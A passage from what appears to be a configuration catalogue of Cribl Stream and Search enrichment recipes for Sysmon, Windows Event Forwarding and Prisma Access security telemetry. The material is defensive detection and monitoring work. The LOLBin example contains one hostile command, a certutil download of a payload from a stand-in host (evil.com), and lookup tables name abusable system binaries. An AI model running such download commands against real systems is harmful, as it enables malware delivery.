        description: 'Enrich process SHA256 hashes against a curated reputation database combining known-good (Microsoft catalog, signed software) and known-bad (threat intel) sources.',
        criblFunction: 'Lookup',
        addedFields: ['file_reputation', 'threat_name', 'first_seen_date', 'prevalence'],
        securityValue: 'Immediately classifies every process execution as known-good, known-bad, or unknown. Unknown processes on critical assets become high-priority investigation targets.',
        observabilityValue: 'Tracks fleet-wide software hygiene — percentage of process executions from unsigned or unknown binaries indicates endpoint security posture.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'process_reputation.csv',
            inputField: 'Hashes (extract SHA256) → sha256',
            outputFields: ['file_reputation', 'threat_name', 'first_seen_date', 'prevalence'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'sha256,file_reputation,threat_name,first_seen_date,prevalence\n7fd065bfa79e34a3b82be36c9b3fdf0a0cda30ab862b9c9d0fb67c6c1e3e8c41,known-good,,2020-01-15,high\n3395856ce81f2b7382dee72602f798b642f14140a3c2a2d26f6c7fce6feadac3,known-bad,Cobalt Strike Beacon,2025-11-20,low\na1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890,known-bad,Mimikatz,2024-08-10,low\nde305d5475b4b5e7bcf5a8e1f0e3d0a2c1b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0,known-good,,2019-06-01,high',
          example: '// Cribl Stream → Processing → Lookup Function\n// Pre-Eval: sha256_hash = Hashes.match(/SHA256=([A-Fa-f0-9]{64})/)?.[1] || \'\'\n// Lookup File: process_reputation.csv\n// Input: sha256_hash → sha256\n// Output: file_reputation, threat_name, first_seen_date, prevalence\n//\n// BEFORE: { Image: "C:\\\\Temp\\\\beacon.exe", Hashes: "SHA256=3395856ce81f2b7382dee72602f798b642f14140a3c2a2d26f6c7fce6feadac3" }\n// AFTER:  { ..., file_reputation: "known-bad", threat_name: "Cobalt Strike Beacon", first_seen_date: "2025-11-20", prevalence: "low" }',
          notes: 'Seed from NSRL + VirusTotal Enterprise. Incrementally add hashes observed in your environment. Unknown hashes with low prevalence are highest-risk investigation targets.'
        }
      },
      {
        name: 'MITRE ATT&CK Mapping Lookup',
        description: 'Map Sysmon event patterns (process creation, network connections, registry modifications) to MITRE ATT&CK technique IDs using a pattern CSV.',
        criblFunction: 'Lookup',
        addedFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic', 'detection_confidence'],
        securityValue: 'Pre-tags endpoint telemetry with ATT&CK context at pipeline level. Enables technique-based correlation, heatmap visualization, and coverage gap analysis without SIEM regex.',
        observabilityValue: 'Powers ATT&CK coverage dashboards — shows which techniques are observed in the environment and which detection rules are actually firing.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'mitre_sysmon_patterns.csv',
            inputField: 'RuleName → rule_pattern',
            outputFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic', 'detection_confidence'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'rule_pattern,mitre_technique_id,mitre_technique_name,mitre_tactic,detection_confidence\ntechnique_id=T1059.001,T1059.001,PowerShell,Execution,high\ntechnique_id=T1003.001,T1003.001,LSASS Memory,Credential Access,high\ntechnique_id=T1547.001,T1547.001,Registry Run Keys,Persistence,medium\ntechnique_id=T1055.012,T1055.012,Process Hollowing,Defense Evasion,high',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: mitre_sysmon_patterns.csv\n// Input: RuleName → rule_pattern (prefix match on technique_id= tag)\n// Output: mitre_technique_id, mitre_technique_name, mitre_tactic, detection_confidence\n//\n// BEFORE: { EventID: 1, RuleName: "technique_id=T1059.001,technique_name=PowerShell", Image: "C:\\\\Windows\\\\System32\\\\powershell.exe" }\n// AFTER:  { ..., mitre_technique_id: "T1059.001", mitre_technique_name: "PowerShell", mitre_tactic: "Execution", detection_confidence: "high" }',
          notes: 'Leverage Sysmon RuleName tags from your Sysmon config (e.g., SwiftOnSecurity or Olaf Hartong configs already include technique_id tags). Map those tags to full ATT&CK metadata.'
        }
      },
      {
        name: 'Parent-Child Legitimacy Evaluation',
        description: 'Evaluate whether the observed parent-child process relationship is expected based on known legitimate execution chains.',
        criblFunction: 'Eval',
        addedFields: ['parent_child_legitimate', 'suspicion_score', 'anomaly_reason'],
        securityValue: 'Detects process injection, living-off-the-land abuse, and unusual execution chains. "winword.exe spawning powershell.exe" is immediately flagged as suspicious.',
        observabilityValue: 'Tracks percentage of anomalous parent-child relationships fleet-wide as an endpoint hygiene metric — sudden spikes indicate widespread issues.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Check parent-child pairs against known-good relationships',
            outputFields: ['parent_child_legitimate', 'suspicion_score', 'anomaly_reason']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Known legitimate parent-child map:\n// const legitimateParents = {\n//   \'powershell.exe\': [\'explorer.exe\', \'cmd.exe\', \'svchost.exe\', \'powershell.exe\'],\n//   \'cmd.exe\': [\'explorer.exe\', \'services.exe\', \'svchost.exe\'],\n//   \'rundll32.exe\': [\'svchost.exe\', \'explorer.exe\', \'cmd.exe\'],\n//   \'regsvr32.exe\': [\'cmd.exe\', \'explorer.exe\', \'msiexec.exe\']\n// };\n// const child = Image.split(\'\\\\\\\\\').pop().toLowerCase();\n// const parent = ParentImage.split(\'\\\\\\\\\').pop().toLowerCase();\n// const expected = legitimateParents[child] || [];\n// parent_child_legitimate = expected.length == 0 ? \'unknown\' : expected.includes(parent) ? \'true\' : \'false\';\n// suspicion_score = parent_child_legitimate == \'false\' ? 80 : parent_child_legitimate == \'unknown\' ? 40 : 0;\n// anomaly_reason = parent_child_legitimate == \'false\' ? `Unexpected parent ${parent} for ${child}` : \'\';\n//\n// BEFORE: { Image: "C:\\\\Windows\\\\System32\\\\powershell.exe", ParentImage: "C:\\\\Program Files\\\\Microsoft Office\\\\winword.exe" }\n// AFTER:  { ..., parent_child_legitimate: "false", suspicion_score: 80, anomaly_reason: "Unexpected parent winword.exe for powershell.exe" }',
          notes: 'Start with Microsoft documentation on expected parent-child chains. Refine with your environment baseline. High false positive rate initially — tune by excluding known automation.'
        }
      },
      {
        name: 'Network Destination Reputation Lookup',
        description: 'Enrich Sysmon network connection events (Event ID 3) with threat intelligence on destination IPs and domains.',
        criblFunction: 'Lookup',
        addedFields: ['dest_reputation', 'dest_threat_category', 'dest_risk_score', 'is_c2_indicator'],
        securityValue: 'Correlates endpoint network connections with threat intel at pipeline level. Process + destination reputation together provide high-confidence C2 detection.',
        observabilityValue: 'Tracks volume of connections to low-reputation destinations per host — a fleet-level indicator of endpoint security posture.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'network_threat_intel.csv',
            inputField: 'DestinationIp → indicator',
            outputFields: ['dest_reputation', 'dest_threat_category', 'dest_risk_score', 'is_c2_indicator'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,dest_reputation,dest_threat_category,dest_risk_score,is_c2_indicator\n198.51.100.1,malicious,C2-Infrastructure,98,true\n203.0.113.50,suspicious,Scanner,65,false\n192.0.2.200,malicious,Botnet-Controller,92,true\n104.244.77.100,suspicious,VPN-Exit-Node,45,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Filter: Only apply on Sysmon EventID 3 (Network Connection)\n// Lookup File: network_threat_intel.csv\n// Input: DestinationIp → indicator\n// Output: dest_reputation, dest_threat_category, dest_risk_score, is_c2_indicator\n//\n// BEFORE: { EventID: 3, Image: "C:\\\\Temp\\\\svchost.exe", DestinationIp: "198.51.100.1", DestinationPort: 443 }\n// AFTER:  { ..., dest_reputation: "malicious", dest_threat_category: "C2-Infrastructure", dest_risk_score: 98, is_c2_indicator: "true" }',
          notes: 'Aggregate from STIX/TAXII feeds, AbuseIPDB, and internal threat intel. Focus on C2 indicators for highest detection value. Combine with process reputation for compound alerting.'
        }
      },
      {
        name: 'LOLBin Classification Lookup',
        description: 'Classify executed processes against the LOLBAS (Living Off the Land Binaries and Scripts) database to identify potential abuse of legitimate system tools.',
        criblFunction: 'Lookup',
        addedFields: ['is_lolbin', 'lolbin_category', 'abuse_technique', 'legitimate_use_context'],
        securityValue: 'Pre-tags LOLBin executions at pipeline level. Combined with parent-child analysis and command-line content, enables high-confidence detection of LOLBin abuse.',
        observabilityValue: 'Tracks LOLBin execution frequency across the fleet — establishes a baseline for expected administrative tool usage vs anomalous spikes.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'lolbas_database.csv',
            inputField: 'Image (extract filename) → binary_name',
            outputFields: ['is_lolbin', 'lolbin_category', 'abuse_technique', 'legitimate_use_context'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'binary_name,is_lolbin,lolbin_category,abuse_technique,legitimate_use_context\ncertutil.exe,true,Download,Ingress Tool Transfer,Certificate management\nmshta.exe,true,Execution,Script Execution via HTA,Legacy HTML application support\nrundll32.exe,true,Execution,DLL Side-Loading,System DLL loading\nbitsadmin.exe,true,Download,BITS transfer abuse,Background file transfers',
          example: '// Cribl Stream → Processing → Lookup Function\n// Pre-Eval: binary_name = Image.split(\'\\\\\\\\\').pop().toLowerCase()\n// Lookup File: lolbas_database.csv\n// Input: binary_name → binary_name (case-insensitive exact match)\n// Output: is_lolbin, lolbin_category, abuse_technique, legitimate_use_context\n//\n// BEFORE: { EventID: 1, Image: "C:\\\\Windows\\\\System32\\\\certutil.exe", CommandLine: "certutil -urlcache -split -f http://evil.com/payload.exe" }\n// AFTER:  { ..., is_lolbin: "true", lolbin_category: "Download", abuse_technique: "Ingress Tool Transfer", legitimate_use_context: "Certificate management" }',
          notes: 'Source from LOLBAS Project (lolbas-project.github.io). Currently ~150 binaries cataloged. Combine with command-line analysis to distinguish legitimate use from abuse.'
        }
      },
      {
        name: 'File Path Risk Scoring',
        description: 'Classify the execution path of processes to identify high-risk locations such as temp directories, user-writable paths, and unusual execution locations.',
        criblFunction: 'Eval',
        addedFields: ['path_risk_score', 'is_temp_path', 'is_user_writable', 'path_anomaly'],
        securityValue: 'Executables running from temp directories, downloads, or user-writable locations are significantly more likely to be malicious. Path context adds signal to process reputation.',
        observabilityValue: 'Tracks percentage of executions from non-standard paths fleet-wide — a leading indicator of policy compliance and endpoint hygiene.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Score file path based on risk characteristics',
            outputFields: ['path_risk_score', 'is_temp_path', 'is_user_writable', 'path_anomaly']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// const imageLower = Image.toLowerCase();\n// is_temp_path = /\\\\(temp|tmp)\\\\/.test(imageLower) ? \'true\' : \'false\';\n// is_user_writable = /\\\\(users|appdata|downloads|desktop|documents)\\\\/.test(imageLower) ? \'true\' : \'false\';\n//\n// path_risk_score = is_temp_path == \'true\' ? 80\n//   : is_user_writable == \'true\' ? 60\n//   : /\\\\windows\\\\(system32|syswow64)\\\\/.test(imageLower) ? 10\n//   : /\\\\program files/.test(imageLower) ? 20 : 50;\n//\n// path_anomaly = (path_risk_score >= 60) ? `High-risk path: ${Image}` : \'\';\n//\n// BEFORE: { Image: "C:\\\\Users\\\\jsmith\\\\AppData\\\\Local\\\\Temp\\\\update.exe", EventID: 1 }\n// AFTER:  { ..., path_risk_score: 80, is_temp_path: "true", is_user_writable: "true", path_anomaly: "High-risk path: C:\\\\Users\\\\jsmith\\\\AppData\\\\Local\\\\Temp\\\\update.exe" }',
          notes: 'Tune risk scores based on your environment. Some legitimate software installs to AppData (Slack, Teams). Whitelist known legitimate user-writable paths to reduce noise.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Historical Process Execution',
        description: 'At investigation time, look up when a process hash was first seen in the environment, how frequently it executes, and on how many hosts.',
        criblFunction: 'Search-time lookup',
        addedFields: ['first_execution_date', 'execution_frequency', 'host_coverage_pct'],
        securityValue: 'Newly-appeared binaries executing on few hosts are high-priority investigation targets. "First seen today, only on 1 host" is a strong malware indicator.',
        observabilityValue: 'Supports software deployment tracking — new binaries appearing across many hosts simultaneously indicate a deployment event vs a single-host anomaly.',
        personas: ['SOC', 'SRE'],
        implementation: {
          example: '// Cribl Search historical process analysis:\n// dataset="windows_sysmon" EventID==1 earliest=-30d\n// | extend sha256 = extract("SHA256=([A-Fa-f0-9]{64})", 1, Hashes)\n// | summarize first_execution_date=min(timestamp), execution_frequency=count(), hosts=dcount(ComputerName) by sha256, Image\n// | extend total_hosts = toscalar(dataset="windows_sysmon" earliest=-1d | summarize dcount(ComputerName))\n// | extend host_coverage_pct = round(hosts / total_hosts * 100, 1)\n// | where sha256 == "$INVESTIGATION_HASH"\n// | project sha256, Image, first_execution_date, execution_frequency, host_coverage_pct',
          notes: 'Low host_coverage_pct (<5%) combined with recent first_execution_date is the strongest signal for novel malware. High coverage + old first_seen = normal enterprise software.'
        }
      },
      {
        name: 'Network Connection Baseline',
        description: 'Compare current network connection patterns for a process against its historical baseline to identify new or anomalous destinations.',
        criblFunction: 'Search-time lookup',
        addedFields: ['baseline_conn_count', 'new_destination_indicator'],
        securityValue: 'Identifies when a legitimate process begins connecting to new destinations — a key indicator of process compromise or DLL injection redirecting traffic to C2.',
        observabilityValue: 'Tracks network behavior stability per process — baseline deviations may indicate configuration drift or infrastructure changes requiring attention.',
        personas: ['SOC', 'SRE'],
        implementation: {
          example: '// Cribl Search network baseline comparison:\n// dataset="windows_sysmon" EventID==3 Image=="$PROCESS" earliest=-1h\n// | summarize current_destinations=dcount(DestinationIp), current_conn_count=count() by Image, ComputerName\n// | join kind=left (\n//     dataset="windows_sysmon" EventID==3 Image=="$PROCESS" earliest=-30d latest=-1d\n//     | summarize baseline_conn_count=avg(count()) by Image, ComputerName, bin(timestamp, 1h)\n//     | summarize baseline_conn_count=avg(baseline_conn_count), known_destinations=dcount(DestinationIp) by Image, ComputerName\n//   ) on Image, ComputerName\n// | extend new_destination_indicator = iif(current_destinations > known_destinations, "true", "false")\n// | where new_destination_indicator == "true"',
          notes: 'Most effective for system processes (svchost, lsass) that have predictable network behavior. New destinations for these processes are strong anomaly signals.'
        }
      }
    ]
  },
  'windows-wef': {
    streamTime: [
      {
        name: 'Subscription Health Evaluation',
        description: 'Calculate event delivery lag by comparing the event timestamp with the time received at the collector, flagging delayed forwarding.',
        criblFunction: 'Eval',
        addedFields: ['delivery_lag_ms', 'is_delayed', 'lag_bucket'],
        securityValue: 'Delayed event forwarding can indicate collector overload, network issues, or deliberate tampering with event delivery to hide attacker activity.',
        observabilityValue: 'Primary health metric for WEF infrastructure — identifies overloaded collectors, problematic subscriptions, and network bottlenecks in the forwarding chain.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Calculate lag between event creation and collector receipt',
            outputFields: ['delivery_lag_ms', 'is_delayed', 'lag_bucket']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// delivery_lag_ms = Date.now() - new Date(TimeCreated).getTime();\n// is_delayed = delivery_lag_ms > 30000 ? \'true\' : \'false\';  // >30s is delayed\n// lag_bucket = delivery_lag_ms < 5000 ? \'realtime\'\n//   : delivery_lag_ms < 30000 ? \'acceptable\'\n//   : delivery_lag_ms < 300000 ? \'delayed\'\n//   : \'critical\';\n//\n// BEFORE: { TimeCreated: "2026-06-08T14:22:18.100Z", Computer: "DC01.corp.local", EventID: 4624 }\n// AFTER:  { ..., delivery_lag_ms: 2500, is_delayed: "false", lag_bucket: "realtime" }',
          notes: 'WEF delivery lag under 5 seconds is ideal. Lag over 5 minutes indicates subscription health issues. Monitor lag_bucket distribution as a fleet health metric.'
        }
      },
      {
        name: 'Source Computer Classification Lookup',
        description: 'Enrich the source computer name with its role, environment, criticality, and owner from the asset inventory.',
        criblFunction: 'Lookup',
        addedFields: ['computer_role', 'computer_environment', 'computer_criticality', 'computer_owner'],
        securityValue: 'Enables priority-based alert routing — security events from domain controllers and Tier-1 servers receive immediate attention vs informational events from workstations.',
        observabilityValue: 'Powers per-role and per-environment event volume dashboards. Identifies which asset classes generate the most events for capacity planning.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'computer_classification.csv',
            inputField: 'Computer → computer_name',
            outputFields: ['computer_role', 'computer_environment', 'computer_criticality', 'computer_owner'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'computer_name,computer_role,computer_environment,computer_criticality,computer_owner\nDC01.corp.local,domain-controller,production,Tier-1,identity-team\nSQL-PROD-01.corp.local,database-server,production,Tier-1,dba-team\nWKSTN-JSMITH.corp.local,workstation,corporate,Tier-3,jsmith\nFILE-01.corp.local,file-server,production,Tier-2,infrastructure-team',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: computer_classification.csv\n// Input: Computer → computer_name (case-insensitive match)\n// Output: computer_role, computer_environment, computer_criticality, computer_owner\n//\n// BEFORE: { Computer: "DC01.corp.local", EventID: 4624, Channel: "Security" }\n// AFTER:  { ..., computer_role: "domain-controller", computer_environment: "production", computer_criticality: "Tier-1", computer_owner: "identity-team" }',
          notes: 'Same asset inventory used across CrowdStrike, firewall, and WEF enrichments. Use FQDN matching for WEF sources. Strip domain suffix if needed for cross-source consistency.'
        }
      },
      {
        name: 'Channel Priority Classification',
        description: 'Classify forwarded events by their original Windows Event Log channel to assign processing priority and routing category.',
        criblFunction: 'Eval',
        addedFields: ['channel_priority', 'channel_category', 'requires_realtime'],
        securityValue: 'Security channel events (4688, 4624, 4625) require real-time processing while operational channels can tolerate batching. Ensures critical events are never delayed.',
        observabilityValue: 'Enables tiered processing — real-time channels get priority pipeline resources while informational channels use batch processing for cost efficiency.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Classify by event channel and category',
            outputFields: ['channel_priority', 'channel_category', 'requires_realtime']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// channel_priority = Channel == \'Security\' ? \'critical\'\n//   : Channel == \'Microsoft-Windows-Sysmon/Operational\' ? \'high\'\n//   : Channel == \'Microsoft-Windows-PowerShell/Operational\' ? \'high\'\n//   : Channel == \'System\' ? \'medium\'\n//   : Channel == \'Application\' ? \'low\' : \'low\';\n//\n// channel_category = Channel.includes(\'Security\') || Channel.includes(\'Sysmon\') ? \'security\'\n//   : Channel.includes(\'PowerShell\') ? \'security\'\n//   : Channel == \'System\' ? \'operational\' : \'informational\';\n//\n// requires_realtime = channel_priority == \'critical\' || channel_priority == \'high\' ? \'true\' : \'false\';\n//\n// BEFORE: { Channel: "Security", EventID: 4625, Computer: "DC01.corp.local" }\n// AFTER:  { ..., channel_priority: "critical", channel_category: "security", requires_realtime: "true" }',
          notes: 'Use channel_priority for pipeline routing decisions — critical/high channels go to real-time SIEM, medium/low can batch to data lake. Reduces SIEM license cost.'
        }
      },
      {
        name: 'Event Volume Anomaly Detection',
        description: 'Compare current event volume per source computer against its historical baseline to detect anomalous spikes or drops.',
        criblFunction: 'Eval',
        addedFields: ['volume_deviation_pct', 'is_volume_anomaly', 'expected_eps'],
        securityValue: 'A sudden volume drop may indicate a compromised host suppressing logging. A spike may indicate brute-force attacks or log flooding attacks against the collector.',
        observabilityValue: 'Identifies WEF collection issues in real-time — volume drops indicate agent failures or network issues before they become visible in downstream dashboards.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Compare current rate against stored baseline',
            outputFields: ['volume_deviation_pct', 'is_volume_anomaly', 'expected_eps']
          },
          example: '// Cribl Stream → Processing → Eval (with Redis/Aggregation state)\n// This requires a stateful approach using Redis or Cribl Aggregations:\n//\n// Step 1: Track per-computer EPS via Redis INCR with 60s TTL\n//   current_eps = Redis GET "eps:{Computer}"\n//\n// Step 2: Compare against stored baseline\n//   expected_eps = Redis GET "baseline_eps:{Computer}" || 10\n//   volume_deviation_pct = Math.round((current_eps - expected_eps) / expected_eps * 100)\n//   is_volume_anomaly = Math.abs(volume_deviation_pct) > 200 ? \'true\' : \'false\'\n//\n// BEFORE: { Computer: "DC01.corp.local", EventID: 4624 }\n// AFTER:  { ..., volume_deviation_pct: 350, is_volume_anomaly: "true", expected_eps: 15 }',
          notes: 'Baseline EPS per computer should be computed from a 7-day rolling average. Volume drops (-90%+) are as concerning as spikes. Alert on both directions.'
        }
      },
      {
        name: 'Forwarding Latency Bucketing',
        description: 'Classify the delivery lag severity into actionable buckets for SLA monitoring and escalation routing.',
        criblFunction: 'Eval',
        addedFields: ['latency_bucket', 'sla_breach', 'escalation_needed'],
        securityValue: 'SLA breaches on security-critical event forwarding indicate potential coverage gaps. Attackers may exploit forwarding delays for detection evasion.',
        observabilityValue: 'Drives WEF SLA dashboards with clear breach indicators. Enables proactive collector scaling before SLA violations cascade.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Bucket delivery latency and determine SLA status',
            outputFields: ['latency_bucket', 'sla_breach', 'escalation_needed']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions (assumes delivery_lag_ms already computed by Subscription Health enrichment):\n// latency_bucket = delivery_lag_ms < 5000 ? \'under-5s\'\n//   : delivery_lag_ms < 30000 ? \'5s-30s\'\n//   : delivery_lag_ms < 60000 ? \'30s-1m\'\n//   : delivery_lag_ms < 300000 ? \'1m-5m\'\n//   : \'over-5m\';\n//\n// sla_breach = (channel_priority == \'critical\' && delivery_lag_ms > 30000) ? \'true\'\n//   : (channel_priority == \'high\' && delivery_lag_ms > 60000) ? \'true\'\n//   : (delivery_lag_ms > 300000) ? \'true\' : \'false\';\n//\n// escalation_needed = sla_breach == \'true\' && is_volume_anomaly == \'true\' ? \'true\' : \'false\';\n//\n// BEFORE: { delivery_lag_ms: 45000, channel_priority: "critical", Computer: "DC01.corp.local" }\n// AFTER:  { ..., latency_bucket: "30s-1m", sla_breach: "true", escalation_needed: "false" }',
          notes: 'SLA thresholds: Critical channels <30s, High channels <60s, Medium/Low <5m. Adjust based on your organization detection SLA requirements.'
        }
      },
      {
        name: 'Computer Asset Lookup',
        description: 'Enrich forwarding computer with full asset details including asset tag, physical location, business unit, and last patch date.',
        criblFunction: 'Lookup',
        addedFields: ['asset_tag', 'location', 'business_unit', 'last_patch_date'],
        securityValue: 'Provides physical and organizational context for security events. "Failed logons from unpatched workstation in remote office" helps assess likely compromise scenarios.',
        observabilityValue: 'Enables location-based WEF health dashboards, identifies sites with high patch debt, and supports business-unit-level event volume analysis.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'computer_assets.csv',
            inputField: 'Computer → computer_fqdn',
            outputFields: ['asset_tag', 'location', 'business_unit', 'last_patch_date'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'computer_fqdn,asset_tag,location,business_unit,last_patch_date\nDC01.corp.local,AST-10042,NYC-DC-1,IT Infrastructure,2026-06-01\nSQL-PROD-01.corp.local,AST-10089,NYC-DC-1,Commerce,2026-05-28\nWKSTN-JSMITH.corp.local,AST-20145,CHI-OFF-3,Engineering,2026-06-05\nLPTP-CONTRACTOR.corp.local,AST-30012,REMOTE,Consulting,2026-04-15',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: computer_assets.csv\n// Input: Computer → computer_fqdn (case-insensitive exact match)\n// Output: asset_tag, location, business_unit, last_patch_date\n//\n// BEFORE: { Computer: "WKSTN-JSMITH.corp.local", EventID: 4625, Channel: "Security" }\n// AFTER:  { ..., asset_tag: "AST-20145", location: "CHI-OFF-3", business_unit: "Engineering", last_patch_date: "2026-06-05" }',
          notes: 'Source from SCCM/Intune for patch dates, ServiceNow CMDB for asset tags and location. Stale patch dates (>30 days) should flag for follow-up with endpoint management.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Delivery Gap Analysis',
        description: 'At investigation time, identify gaps in event delivery from specific computers — periods where no events were received despite the computer being online.',
        criblFunction: 'Search-time lookup',
        addedFields: ['last_event_time', 'gap_duration_minutes', 'is_gap_anomaly'],
        securityValue: 'Delivery gaps may indicate an attacker disabled or corrupted event forwarding on a compromised host. Gaps on domain controllers are especially critical.',
        observabilityValue: 'Identifies WEF subscription failures and network issues causing event loss. Prevents silent data gaps that could mask operational issues.',
        personas: ['SOC', 'SRE'],
        implementation: {
          example: '// Cribl Search delivery gap analysis:\n// dataset="windows_wef" earliest=-24h\n// | summarize last_event_time=max(timestamp), event_count=count() by Computer, bin(timestamp, 15m) as time_bucket\n// | order by Computer asc, time_bucket asc\n// | extend prev_bucket = prev(time_bucket), prev_computer = prev(Computer)\n// | where Computer == prev_computer\n// | extend gap_duration_minutes = datetime_diff(\'minute\', time_bucket, prev_bucket)\n// | where gap_duration_minutes > 15\n// | extend is_gap_anomaly = iif(gap_duration_minutes > 60, "critical", iif(gap_duration_minutes > 30, "warning", "info"))\n// | order by gap_duration_minutes desc',
          notes: 'Gaps >15 minutes are noteworthy, >60 minutes are critical for Tier-1 assets. Cross-reference with host uptime — if the host was online during the gap, investigate immediately.'
        }
      },
      {
        name: 'Cross-Computer Correlation',
        description: 'At investigation time, correlate events from a specific computer with related alerts and events from other hosts in the same time window.',
        criblFunction: 'Search-time lookup',
        addedFields: ['related_alerts_24h', 'correlated_hosts_count'],
        securityValue: 'Identifies lateral movement patterns — if one compromised host triggers alerts, searching for similar patterns on other hosts reveals the attack scope.',
        observabilityValue: 'Identifies systemic issues affecting multiple hosts simultaneously — useful for distinguishing targeted attacks from infrastructure-wide problems.',
        personas: ['SOC', 'SRE'],
        implementation: {
          example: '// Cribl Search cross-computer correlation:\n// dataset="windows_wef" Computer=="$SUSPECT_HOST" EventID in (4624, 4625, 4648, 4672) earliest=-24h\n// | summarize SuspectEvents=makeset(EventID), SuspectUsers=makeset(TargetUserName) by Computer\n// | join kind=inner (\n//     dataset="windows_wef" EventID in (4624, 4625, 4648, 4672) earliest=-24h\n//     | where Computer != "$SUSPECT_HOST"\n//     | where TargetUserName in ($SUSPECT_USERS) or IpAddress in ($SUSPECT_IPS)\n//     | summarize related_alerts_24h=count(), correlated_hosts_count=dcount(Computer) by TargetUserName\n//   ) on TargetUserName=TargetUserName\n// | extend lateral_movement_risk = iif(correlated_hosts_count > 3, "high", iif(correlated_hosts_count > 1, "medium", "low"))\n// | order by correlated_hosts_count desc',
          notes: 'Start with the suspect host, extract IOCs (usernames, IPs, event patterns), then search for those IOCs across all other hosts. correlated_hosts_count >3 strongly indicates lateral movement.'
        }
      }
    ]
  },
  'prisma-access-traffic': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add country, city, and ASN to source_ip and destination_ip using MaxMind GeoIP database for geographic context on Prisma Access traffic flows.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_city', 'dest_country', 'dest_city', 'src_asn', 'dest_asn'],
        securityValue: 'Identifies traffic to/from high-risk geographies, enables impossible travel detection for remote users, and highlights connections to known hostile ASNs.',
        observabilityValue: 'Enables geographic traffic distribution dashboards for SASE, identifies regional performance patterns, and supports egress gateway optimization.',
        personas: ['SOC', 'NOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'source_ip',
            additionalInputs: ['destination_ip'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dest_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: source_ip → src_country, src_city, src_asn\n// Input Field: destination_ip → dest_country, dest_city, dest_asn\n//\n// BEFORE: { source_ip: "203.0.113.55", destination_ip: "198.51.100.10" }\n// AFTER:  { ..., src_country: "AU", src_city: "Sydney", src_asn: "AS1221",\n//           dest_country: "US", dest_city: "Ashburn", dest_asn: "AS16509" }',
          notes: 'MaxMind databases auto-update weekly. For Prisma Access, source_ip is the user tunnel IP — ensure the pre-NAT IP is used for meaningful geo results.'
        }
      },
      {
        name: 'User Department Lookup',
        description: 'Enrich the authenticated username with organizational context including department, manager, and office location from HR/identity directory.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_manager', 'user_location'],
        securityValue: 'Enables department-scoped detection rules — e.g., finance users accessing engineering resources triggers alert. Supports insider threat baselining by department.',
        observabilityValue: 'Enables per-department bandwidth and application usage reporting for capacity planning and chargeback models.',
        personas: ['SOC', 'SRE', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_directory.csv',
            inputField: 'username → user',
            outputFields: ['user_department', 'user_manager', 'user_location'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'user,department,manager,location\njsmith,Engineering,Maria Garcia,San Jose\njdoe,Finance,Robert Chen,New York\nagarza,Customer Success,Jordan Perks,Austin\nmwilson,Marketing,Sarah Lee,London',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_directory.csv\n// Input: username → user (exact match)\n// Output: department → user_department, manager → user_manager, location → user_location\n//\n// BEFORE: { username: "jsmith", app: "salesforce", bytes_out: 524288 }\n// AFTER:  { ..., user_department: "Engineering", user_manager: "Maria Garcia", user_location: "San Jose" }',
          notes: 'Source from Azure AD/Okta SCIM export or HR system feed. Update hourly to capture org changes. Handle terminated users by marking department as "TERMINATED" to trigger alerts on post-termination access.'
        }
      },
      {
        name: 'Application Risk Classification',
        description: 'Classify applications by risk level using an Eval function based on app category, sanction status, and organizational policy.',
        criblFunction: 'Eval',
        addedFields: ['app_risk_level', 'app_sanctioned', 'app_category_risk'],
        securityValue: 'Flags unsanctioned SaaS and high-risk application usage at pipeline time. Enables shadow IT detection and DLP policy enforcement based on app classification.',
